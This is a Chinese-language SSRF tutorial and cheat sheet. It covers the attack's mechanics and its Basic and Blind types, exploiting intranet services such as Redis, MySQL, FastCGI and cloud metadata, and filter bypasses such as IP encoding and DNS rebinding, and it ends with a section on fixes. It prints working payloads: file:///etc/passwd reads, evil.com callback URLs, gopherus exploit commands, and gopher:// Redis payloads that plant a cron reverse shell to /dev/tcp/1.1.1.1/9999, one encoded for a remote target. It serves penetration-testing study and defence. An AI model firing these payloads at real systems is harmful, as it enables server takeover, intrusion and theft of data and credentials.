### 简介

SSRF (Server Side Request Forgery) 

任何能够直接或间接地使server发起网络请求的功能，如果该功能的参数是用户可控的，且对用户输入没有做严格的输入验证，就很有可能存在SSRF

### 原理

"隔山打牛"

```
Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> Server2
     /\                           |        /\                         \/ 
     |                           \/         |                         | 
     '-----<----【4】resp----<----'         '---<----【3】resp----<----' 
```

```
流量走向                      流程说明
attacker -> SSRFserver      【1】攻击者发送Requset1到存在SSRF漏洞的Server.  req1:https://x.com/?url=http://<internal_hostname>:<port>/
SSRFserver -> internalServer【2】SSRFserver为"跳板" 发出Requset2.          req2:http://<internal_hostname>:<port>/
internalServer -> SSRFserver【3】SSRFserver得到req2的真实响应内容.
SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内容返回给攻击者则为Basic SSRF，否则为Blind SSRF.
```


* 第一个请求 通常是HTTP协议
* 第二个请求 由应用程序本身功能决定 理论上可以有各种protocol/scheme
  * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
  * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
  * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
  * `ldap://` 轻量级目录访问协议
    * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议
    * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
  * `gopher://` Gopher是一种分布式文档传递服务
    * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`


### 分类

SSRF漏洞分类

* 攻击者角度 按漏洞利用效果分类
  * Basic SSRF - 可回显 (攻击者可见 真实响应内容【3】为真实响应 【4】响应的body与【3】它完全相同)
    * 攻击者可利用"SSRFserver"访问内网主机 (如同一内网的`oa.intranet.apple-inc.com`) 并在"SSRFserver"域下看到内网的`oa.intranet.apple-inc.com`的响应内容(如 oa登录页面)
    * 攻击者可利用"SSRFserver"访问公网主机 (如攻击者的`evil.com`) 并在"SSRFserver"域下看到`evil.com`的响应内容(如 XSSpayload)
  * Blind SSRF - 不可回显 (攻击者不可见真实响应内容  【3】为真实响应 【4】响应的body固定不变)  需要通过间接方式观察响应 进行判断
    * HTTP response status - HTTP响应的状态码(200 500)
    * HTTP response time - 时间间隔的长短(得到HTTP响应时间点-发起HTTP请求的时间点)

* 开发者角度 按web应用的功能分类
  * 类型1 http请求中有参数值"URL地址" 开发者没做好严格的输入验证 server直接访问"URL地址" 触发SSRF
    * web在线代理
    * 资源下载   图片.png、图标.ico、网页.html、文本.txt 等
    * 分享
    * url跳转 支持了URL Schema(file等协议) 可读取本机文件 `http://x.com/click.jsp?url=http://127.0.0.1:8082/config/dbconfig.xml`
    * ...
  * 类型2 用户上传文件(常见文件类型 `SVG` `JPG` `XML` `JSON`)  对该文件进行 解析、处理、渲染 文件过程中触发SSRF
    * 网页处理 (将网页内容变为适应手机屏幕的格式)
    * 图片处理 如ImageMagick CVE-2016-3718  如[PhantomJS Image Rendering](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
    * 图片处理 ImageMagick CVE-2016-3718
    * 视频音频处理 Ffmpeg文件读取漏洞 CVE-2016-1897  CVE-2016-1898
      * [新浪微盘存在Ffmpeg文件读取漏洞-SSRF](https://www.secpulse.com/archives/49510.html)
      * [FFmpeg任意文件读取漏洞分析 - 知乎](https://zhuanlan.zhihu.com/p/28255225)

### 漏洞利用

通过"SSRFserver"与目标主机交互,目标主机的网络位置可以在内网 公网:
* 公网 - 可通过"SSRFserver"与公网主机交互
  * 利用SSRF实现XSS - 攻击者可利用"SSRFserver"访问公网主机 (如攻击者的evil.com) 并在"SSRFserver"域下看到evil.com的响应内容(如 XSSpayload)
  * 利用SSRF实现钓鱼
  * ...
* 内网 - 可通过"SSRFserver"与内网主机交互 对"SSRFserver"所在内网的其他可达的服务器进行探测或渗透
  * 探测内网(Probe intranet)
    * 如果"SSRFserver" 不可回显Response:
      * IP - 探测内网网络架构 存活主机
      * service/port - 端口开放情况 如数据库类的服务 （常用判断依据：HTTP响应码、HTTP响应时长）
    * 如果"SSRFserver" 可回显Response:
      * 内网资产搜集 + 横向移动
        * 根据SSRF回显的Response可得到web前端代码 可进行"指纹识别" 以搜集内网资产(web应用等) 可能会发现适合横向移动的目标
          * 比如tomcat的一个指纹是 [tomcat.png](https://github.com/apache/tomcat/tree/master/webapps/ROOT)
      * 通过SSRF漏洞获取实例的"元数据" (该方法只只适用于云环境下的Cloud Instances)
        * 说明:如果具有SSRF漏洞的Web应用在云环境中某个实例(OS)上运行，则可通过SSRF漏洞实现用该实例的IP，去访问云服务商提供的"让内部主机查询自身元数据的服务" 以获取该实例的 "元数据". 不同的云服务商都有这个风险
          * AWS(Amazon Web Services) - 利用AWS的"实例元数据服务"(Instance Metadata service,IMS) 即可获取该云实例的"元数据"(Aws keys, ssh keys and [more](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)) 
          * Microsoft Azure
          * Google Cloud Engine
          * ...

渗透内网的常用exploit
  * 获取主机权限 或 挖掘其他漏洞(可作为[RCE Chain](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)中的一环)
    * web - SQLi(SSRF可回显Response时 才可用)
    * web - Struts2 RCE
    * web - Confluence Unauthorized RCE(CVE-2019-3396)
    * web - Jenkins插件RCE（CVE-2019-1003000  CVE-2019-1003001  CVE-2019-1003002)
    * web - Github Enterprise RCE < 2.8.7
    * web - Tomcat Manager 暴力枚举
    * web - PHP FastCGI RCE
      * 利用条件 端口9000可访问 且未配置身份认证
      * 工具命令 `gopherus --exploit fastcgi`
    * Redis未授权/弱口令导致RCE
      * 利用条件 redis以root权限启动 端口6379可未授权访问 可执行任意redis命令
      * 利用方式1 反弹shell - 执行redis命令`flushall` 然后写一个定时任务crontab(bash脚本) 保存到`/var/spool/cron/` 即可
      * 利用方式2 get webshell - 执行redis命令`flushall` 然后写入webshell文件 保存到web目录
      * 工具命令 `gopherus --exploit redis`
    * MongoDB未授权/弱口令可获取数据
    * MySQL未授权 RCE
      * 利用条件:如果MySQL Server某账号为空口令 则可[构造Gopher链接](https://spyclub.tech/2018/02/05/2018-02-05-ssrf-through-gopher/) 发送tcp数据到MySQL端口(3306)以执行任意SQL语句
      * 利用方式1 get webshell - 执行SQL语句 写入webshell文件 保存到web目录
      * 利用方式2 获取数据 - 构造SQL语句发出带外请求
      * 工具命令 `gopherus --exploit mysql`
    * Memcached 未授权/弱口令可获取数据 可RCE 默认端口11211
      * Python-Pickle De-serialization `gopherus --exploit pymemcache`
      * PHP De-serialization `gopherus --exploit phpmemcache`
      * Ruby-Marshal De-serialization `gopherus --exploit rbmemcache`
      * dumping Memcached content  `gopherus --exploit dmpmemcache`
    * Zabbix 默认端口10050
      * 利用条件 Zabbix服务器开放了10050端口并配置了`EnableRemoteCommands = 1` 则可执行shell命令
      * 工具命令 `gopherus --exploit zabbix` 
    * SMTP  默认端口25
      * 利用方式 利用开放的SMTP端口发送邮件
      * 工具命令 `gopherus --exploit smtp`
    * ...

工具[Gopherus](https://github.com/tarunkant/Gopherus)可以生成`gopher://`链接 以便利用已知的SSRF漏洞 构造`gopher://`链接 发送tcp数据 攻击内网.


### 绕过技巧

* webserver层面 - 利用server特性进行绕过
  * "请求夹带"(Request Smuggling) - 使用格式不正确的HTTP headers或利用Web服务器的特定"解析"(parsing)行为，将来自攻击者的请求注入到另一个请求的开头
  * "请求分割"(Request Splitting) - 使用特定的Unicode字符，利用HTTP基于文本的特性，以在请求中使用"协议控制字符"(protocol control indicators)来分割行，以实现能够传递SSRF payload的注入。具体参考[Security Bugs in Practice: SSRF via Request Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)


* web应用层面 - 绕过不严谨的"域名校验编程实现"
  * 使用@ `a.com@10.10.10.10` `a.com:b@10.10.10.10`
  * IP地址的不同形式 - 进制转换
    * 十进制形式 `127.0.0.1 <-> 2130706433` 计算方法`(127)*256^3+(0)*256^2+(0)*256^1+(1)*256^0=2130706433`  `(21)*256^1+(200)=5576` 如bing的外网IP转换为十进制形式 `13.107.21.200 <-> 13.107.5576 <-> 13.7017928 <-> 225121736`
    * 十六进制形式 `13.107.21.200 <-> 0xD6B15C8`
    * 混合各形式 如八进制.十进制 `13.107.21.200 <-> 015.7017928`
  * 自定义域名解析
    * 利用 [xip.name](https://github.com/peterhellberg/xip.name) 类似的还有 nip.io xip.io
      * `127.0.0.1 <-> http://2130706433.xip.name`支持十进制. 支持任意前缀`ping qq.com.127.0.0.1.xip.name`
      * `10.100.21.7 <-> http://10.100.21.7.xip.io` `https://182.61.200.6.xip.io` SSL证书会"无效"
    * 利用 https://sslip.io 支持ssl 支持ipv6
      * https://52-0-56-137.sslip.io/
  * DNS重绑定(DNS Rebinding) **重点** 攻击步骤
    * 搭建ns服务器 - 搭建ns服务器`ns1.evil.com` 对域名`a.evil.com`的解析都由`ns1.evil.com`完成.
    * 设置缓存时间 - 设置一条NS记录 使`a.evil.com`的缓存时间为0 即`TTL=0`. 所以每次访问`a.evil.com`都需要向`ns1.evil.com`发起DNS查询得到它最新的A记录
    * 攻击者发出HTTP请求 提交参数值`a.evil.com`到目标站点的后端
    * 后端验证:后端逻辑对`a.evil.com`进行"第1次域名解析" 得到了合法的外网IP 并判断发现不是内网IP 则anti-SSRF验证通过 继续向下执行
    * 攻击者修改域名解析:经过"第1次域名解析"后 利用短暂的时间差 快速修改ns服务器`ns1.evil.com`上的A记录为内网IP`10.10.2.2`
    * 后端执行:后端的程序逻辑继续使用刚才得到的参数值`a.evil.com`(由于`ns1.evil.com`对`a.evil.com`设置的A记录缓存时间`TTL=0` 所以后端对`a.evil.com`做了"第2次域名解析" 此时得到了内网IP`10.10.2.2`)
    * 后端使用了解析得到的内网内网IP`10.10.2.2` SSRF攻击成功
  * 短网址跳转 - "短网址"响应(301 永久重定向)到内网地址 `http://10.10.116.11 => http://t.cn/RwbLKDx`
  * JavaScript跳转


SSRF自动化工具 用于发现漏洞、生成payload等

|名称|属性|描述|
|:-------------:|--|-----|
|[swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)|python3|Automatic SSRF fuzzer and exploitation(RCE漏洞利用) tool|
|[cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)|python|生成不同形式的SSRF payload (IP obfuscator ...)|
|[D4Vinci/Cuteit(IP obfuscator)](https://github.com/D4Vinci/Cuteit)|python2|IP obfuscator 将恶意IP改为各种格式以绕过安全检测|
|[tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)|python2|生成gopher link 以利用SSRF漏洞 对其他服务器的RCE漏洞进行利用 |

### 修复方案

* 根据应用程序的设计需求和功能 需要对非本机发出请求的场景 通常分为2种情况
  * 情况1:只需要向"指定"主机(域名/IP)发送请求
    * 修复方案:设置 主机(域名/IP)白名单列表，只允许web应用访问白名单列表中的主机
  * 情况2:需要向"任意"主机(域名/IP)发送请求 无法设置 主机(域名/IP)白名单列表
    * 设置协议白名单 - 仅允许必要的协议 如`http`和`https` 避免攻击者使用其他协议(如 `file://`，`phar://`，`gopher://`，`data://`，`dict://`等) 
    * 输入验证(Input validation)
      * 严格限制参数值的内容 - 参数值内容 视业务而定(如果参数值为IP/域名 可使用编程语言的标准库验证是否为有效的IP/域名)
      * 严格限制参数值的长度 - 字符串的最大长度 视业务而定
      * 字符黑名单检测 - 根据应用程序的实际需求，如果按实际需求参数值中不会有特殊字符，则添加检测逻辑：如果有非预期的非法字符(如 `#` `@` `?` 等)  则`return false` 拒绝向下执行
    * 禁止重定向(Redirect)
      * 301 redirect 永久性转移(Permanently Moved)
      * 302 redirect 暂时性转移(Temporarily Moved)
    * ...

参考 https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md

-----

### gopher协议 - 利用原理

前提：存在SSRF漏洞的web后端所在的服务器支持gopher协议.

攻击者构造http请求中如`gopher://`的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。

先在攻击者公网主机ReciveData.com上监听1337端口，看一会能否收到数据:
```
evil.com:# nc -lvp 1337
```

gopher.php (在攻击者的公网web服务器gopher.com上) :
如果有http请求访问 http://gopher.com/gopher.php 则httpResponse将会是一个301、302跳转，使用gopher协议对某主机的某端口发送数据。
```
<?php
  header('Location: gopher://ReciveData.com:1337/_Hi%0Assrf');
?>
```

攻击者构造http请求，试图让 存在SSRF漏洞的web后端所在的服务器 去访问 http://gopher.com/gopher.php


测试结果，攻击者公网主机ReciveData.com的1337端口，收到了 存在SSRF漏洞的web后端所在的服务器 发来的数据：
```
Hi
ssrf
```

[SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`


### cURL支持的协议

cURL支持的协议很多
```
$ curl -V
curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  
Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  
Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets
```

```
# dict protocol (操作Redis)
# 本地测试
curl -vvv 'dict://127.0.0.1:6379/info'
```

```
# file protocol (任意文件读取)
# 本地测试
curl -vvv 'file:///etc/passwd'
```

```
# gopher protocol (利用redis写入var/spool/cron实现反弹Bash)  注意:会清空redis的数据!
# 本地测试 方式1
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'

# 本地测试 方式2
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'

# 远程测试 方式3
curl -v 'http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F1.1.1.1%2F9999%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
```
